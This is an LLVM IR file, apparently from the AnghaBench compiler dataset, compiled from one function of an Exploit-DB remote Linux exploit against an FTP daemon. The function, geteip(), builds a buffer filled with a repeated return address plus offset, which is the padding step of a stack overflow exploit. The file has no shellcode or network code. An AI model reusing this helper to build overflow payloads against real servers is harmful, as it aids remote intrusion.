; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22893.c_geteip.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22893.c_geteip.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@EIPSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"ftpd_read(): allocating memory failed.\00", align 1
@RETADDR = common dso_local global i64 0, align 8
@offset_ra = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @geteip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  store i32 0, i32* %1, align 4
  %3 = load i32, i32* @EIPSIZE, align 4
  %4 = add nsw i32 %3, 1
  %5 = call i64 @malloc(i32 %4)
  %6 = inttoptr i64 %5 to i8*
  store i8* %6, i8** %2, align 8
  %7 = icmp ne i8* %6, null
  br i1 %7, label %10, label %8

8:                                                ; preds = %0
  %9 = call i32 @printe(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %10

10:                                               ; preds = %8, %0
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* @EIPSIZE, align 4
  %13 = add nsw i32 %12, 1
  %14 = call i32 @memset(i8* %11, i32 0, i32 %13)
  store i32 0, i32* %1, align 4
  br label %15

15:                                               ; preds = %28, %10
  %16 = load i32, i32* %1, align 4
  %17 = load i32, i32* @EIPSIZE, align 4
  %18 = icmp ult i32 %16, %17
  br i1 %18, label %19, label %31

19:                                               ; preds = %15
  %20 = load i64, i64* @RETADDR, align 8
  %21 = load i64, i64* @offset_ra, align 8
  %22 = add nsw i64 %20, %21
  %23 = load i8*, i8** %2, align 8
  %24 = load i32, i32* %1, align 4
  %25 = zext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = bitcast i8* %26 to i64*
  store i64 %22, i64* %27, align 8
  br label %28

28:                                               ; preds = %19
  %29 = load i32, i32* %1, align 4
  %30 = add i32 %29, 4
  store i32 %30, i32* %1, align 4
  br label %15

31:                                               ; preds = %15
  %32 = load i8*, i8** %2, align 8
  ret i8* %32
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
